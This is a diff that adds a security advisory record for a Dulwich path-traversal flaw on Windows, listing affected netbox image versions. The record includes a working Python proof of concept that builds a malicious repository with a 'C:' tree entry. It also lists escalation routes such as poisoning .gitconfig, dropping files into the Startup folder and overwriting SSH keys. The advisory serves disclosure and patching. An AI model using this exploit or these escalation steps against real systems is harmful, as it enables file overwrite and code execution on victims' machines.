@@ -1,0 +1,88 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-xx5r-g3qp-2cxg-scki",
+  "modified": "2026-11-12T23:57:09Z",
+  "published": "2026-11-12T23:57:09Z",
+  "upstream": [
+    "GHSA-8mcx-5rqc-vhmf"
+  ],
+  "summary": "### Affected files",
+  "details": "### Affected files\n* `dulwich/index.py` (Methods: `validate_path_element_ntfs`, `_tree_to_fs_path`)\n* `dulwich/porcelain/__init__.py` (Method: `_checked_worktree_path`)\n\n### Description / Summary\nA High-severity Path Traversal vulnerability exists in Dulwich's checkout logic when running on Windows. The functions responsible for validating NTFS paths strictly reject `.git` variants, Alternate Data Streams (ADS), `git~1` short names, and reserved device names, but they completely fail to check for **DOS drive letter prefixes**.\n\nA malicious Git tree can contain an entry named `C:`. When Dulwich processes this tree on a Windows client, the string passes the `validate_path_element_ntfs` check. Later, `_tree_to_fs_path` passes this path to `os.path.join(root, b\"C:\\\\\\\\Users\\\\\\\\...\")`. \n\nOn Windows, if the second argument to `os.path.join` contains an absolute drive letter, the `root` path is completely discarded. As a result, Dulwich writes the repository file to the absolute path outside of the intended Git worktree.\n\nWhile the standard C `git` client explicitly blocks this via `has_dos_drive_prefix()` in `path.c`, Dulwich lacks this protection. Because Git trees are cross-platform, an attacker can author a malicious repository on Linux and wait for a Windows victim (or CI runner) to clone it.\n\n### Potential impact\n\nThis vulnerability allows an attacker to achieve **Arbitrary File Write**, which can trivially be escalated to **Remote Code Execution (RCE)** or total system compromise on the victim's Windows machine.\n\nAttack vectors include:\n1. **Git Config Poisoning (RCE):** Writing a malicious `C:\\\\Users\\\\<victim>\\\\.gitconfig` file to set `core.sshCommand` to an arbitrary executable, granting RCE the next time the user interacts with Git.\n2. **Persistence (RCE):** Dropping a malicious executable into `C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\`.\n3. **SSH Key Overwrite:** Writing to `C:\\\\Users\\\\<victim>\\\\.ssh\\\\authorized_keys` to compromise remote servers accessible by the victim.\n4. **CI/CD Compromise:** If a Windows-based CI/CD runner (e.g., GitHub Actions) automatically clones a malicious pull request, the runner is instantly compromised, potentially leaking repository secrets.\n\n### Proof of Concept (PoC)\nThe following Python script (runnable on Linux) generates a malicious Git repository containing a payload that targets Windows clients.\n\n```python\nfrom dulwich.objects import Blob, Tree, Commit\nfrom dulwich.repo import Repo\nimport os, tempfile\n\nrepo_path = tempfile.mkdtemp()\nrepo = Repo.init(repo_path)\n\n# 1. Build the payload blob.\nblob = Blob(); blob.data = b\"pwned-by-drive-letter\\\\n\"\nrepo.object_store.add_object(blob)\n\n# 2. Build the malicious tree hierarchy: C:/Users/victim/evil.txt\nevil_txt = Tree();   evil_txt[b\"evil.txt\"] = (0o100644, blob.id)\nrepo.object_store.add_object(evil_txt)\nvictim_dir = Tree(); victim_dir[b\"victim\"] = (0o040000, evil_txt.id)\nrepo.object_store.add_object(victim_dir)\nusers_dir  = Tree(); users_dir[b\"Users\"]   = (0o040000, victim_dir.id)\nrepo.object_store.add_object(users_dir)\n\n# VULNERABILITY: The \"C:\" directory bypasses validation\nc_drive    = Tree(); c_drive[b\"C:\"]        = (0o040000, users_dir.id)\nrepo.object_store.add_object(c_drive)\n\ncommit = Commit()\ncommit.tree = c_drive.id\ncommit.message = b\"add feature\"\ncommit.author = commit.committer = b\"attacker <a@evil.example>\"\ncommit.author_time = commit.commit_time = 1700000000\ncommit.author_timezone = commit.committer_timezone = 0\nrepo.object_store.add_object(commit)\nrepo.refs[b\"refs/heads/main\"] = commit.id\n\nprint(f\"Malicious repo created at {repo_path}\")\nprint(f\"Clone with: dulwich clone {repo_path} /target/win/worktree\")\n# Result: A Windows checkout of this commit writes the payload directly to C:\\\\Users\\\\victim\\\\evil.txt\n```",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "netbox",
+        "purl": "pkg:deb/dhi/netbox"
+      },
+      "versions": [
+        "4.6.10-0",
+        "4.6.10-1",
+        "4.6.7-0",
+        "4.6.8-0",
+        "4.6.8-1",
+        "4.6.8-2",
+        "4.6.8-3",
+        "4.6.9-0",
+        "4.6.9-1",
+        "4.6.9-2",
+        "4.7.1-0",
+        "4.7.1-1",
+        "4.7.1-2",
+        "4.7.1-3",
+        "4.7.1-4",
+        "4.7.1-5",
+        "4.7.1-6",
+        "4.7.2-0",
+        "4.7.2-1",
+        "4.7.2-2",
+        "4.7.2-3",
+        "4.7.2-4",
+        "4.7.3-0",
+        "4.7.3-1",
+        "4.7.3-2",
+        "4.7.3-3",
+        "4.7.3-4",
+        "4.7.4-0",
+        "4.7.4-1",
+        "4.7.4-2",
+        "4.7.4-3",
+        "4.7.4-4",
+        "4.7.4-5",
+        "4.7.4-6",
+        "4.7.5-0"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-xx5r-g3qp-2cxg-scki"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-8mcx-5rqc-vhmf"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/jelmer/dulwich/security/advisories/GHSA-8mcx-5rqc-vhmf"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/jelmer/dulwich/commit/4ca77f9f470742ba246cd6fa07beb6d735045664"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jelmer/dulwich/releases/tag/dulwich-1.2.9"
+    }
+  ]
+}
